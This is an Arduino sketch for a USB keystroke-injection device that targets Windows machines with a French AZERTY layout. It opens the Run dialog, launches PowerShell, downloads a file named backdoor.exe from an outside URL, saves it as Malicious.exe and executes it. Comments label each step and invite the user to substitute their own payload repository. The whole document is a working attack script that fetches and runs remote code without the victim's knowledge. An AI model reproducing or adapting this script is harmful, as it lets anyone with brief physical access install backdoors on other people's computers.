#include <KeyboardAzertyFr.h>
//This script works only for a computer configured for a Keyboard Azerty version France -- The Arduino Library of this keyboard is on https://github.com/martin-leo/KeyboardAzertyFr

#define URL "https://senechaljulien.com/RepoGitHub/backdoor.exe" \\Change with your repo

void setup() {
  KeyboardAzertyFr.begin();
  delay(1000);

  KeyboardAzertyFr.press(0x83);
  delay(200);
  KeyboardAzertyFr.print("r");
  KeyboardAzertyFr.releaseAll();
  delay(300);

  KeyboardAzertyFr.print("powershell.exe");
  KeyboardAzertyFr.press(KEY_RETURN);
  delay(100);
  KeyboardAzertyFr.release(KEY_RETURN);
  delay(1000);

//Download the backdoor
  KeyboardAzertyFr.print("Invoke-WebRequest -Uri ");
  KeyboardAzertyFr.print(URL);
  KeyboardAzertyFr.print(" -OutFile Malicious.exe");
  KeyboardAzertyFr.press(KEY_RETURN);
  delay(100);
  KeyboardAzertyFr.release(KEY_RETURN);
  delay(1000);

//Run it
  KeyboardAzertyFr.print(".");
  KeyboardAzertyFr.press(KEY_RIGHT_ALT);
  KeyboardAzertyFr.print("_");
  KeyboardAzertyFr.releaseAll();
  KeyboardAzertyFr.print("Malicious.exe");
  
  KeyboardAzertyFr.press(KEY_RETURN);
  delay(100);
  KeyboardAzertyFr.release(KEY_RETURN);
  delay(1000);

  KeyboardAzertyFr.end();
}


void loop() {
  // put your main code here, to run repeatedly:

}
